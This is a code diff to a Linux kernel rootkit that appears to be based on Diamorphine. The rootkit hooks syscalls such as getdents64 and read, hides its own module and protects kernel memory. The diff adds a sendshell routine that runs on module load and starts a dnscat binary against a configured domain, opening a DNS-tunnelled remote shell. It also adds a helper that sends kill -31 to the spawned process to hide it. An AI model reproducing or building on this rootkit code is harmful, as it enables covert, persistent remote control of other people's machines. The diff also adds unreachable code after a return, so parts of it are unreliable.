@@ -4,6 +4,7 @@
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/version.h> 
+#include <linux/sched/task.h>
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 #include <asm/uaccess.h>
 #endif
@@ -87,6 +88,7 @@ get_syscall_table_bf(void)
 #endif
 }
 
+
 struct task_struct *
 find_task(pid_t pid)
 {
@@ -121,6 +123,18 @@ int file_check(void *arg, ssize_t size)
 out:
 	kfree(buf);
 	return ret;
+}
+
+// hiding the dnscat process 
+// one of the worst ways possible to do this, but who cares, it works
+static int init_func(struct subprocess_info *info, struct cred *new)
+{
+		char pid_str[12];
+		sprintf(pid_str, "%d", current->pid);
+		char *argv[] = {"/usr/bin/kill", "-31", NULL, NULL};
+		argv[2] = pid_str;
+        call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
+		return 0;
 }
 
 int hide_content(void *arg, ssize_t size)
@@ -172,6 +186,27 @@ is_invisible(pid_t pid)
 		return 1;
 	return 0;
 }
+
+void sendshell(void) { 
+	int ret = 0;
+	struct subprocess_info *sub_info;
+	char *envp[] = {
+				"HOME=/root",
+				"TERM=xterm",
+				NULL
+			};
+
+	char *argv[] = {
+				RK_PATH"dnscat",
+				domain,
+				NULL
+			};
+
+	sub_info = call_usermodehelper_setup(argv[0],argv,envp, GFP_ATOMIC, init_func, NULL, NULL);
+	if (sub_info == NULL) return;
+	ret = call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
+}
+
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
@@ -333,7 +368,8 @@ hacked_read(unsigned int fd, char __user *buf, size_t count)
 	atomic_set(&read_on, 0);
 	return ret;
 
-	
+	if (err)
+		return 0;
 }
 
 void
@@ -487,7 +523,6 @@ diamorphine_init(void)
 	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
 	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
 #endif
-
 	module_hide();
 	tidy();
 
@@ -513,8 +548,14 @@ diamorphine_init(void)
 
 	protect_memory();
 
+	if (DNSCATSHELL > 0) 
+		sendshell();
+	else 
+		 return 0;
+
 	return 0;
 }
+
 
 static void __exit
 diamorphine_cleanup(void)
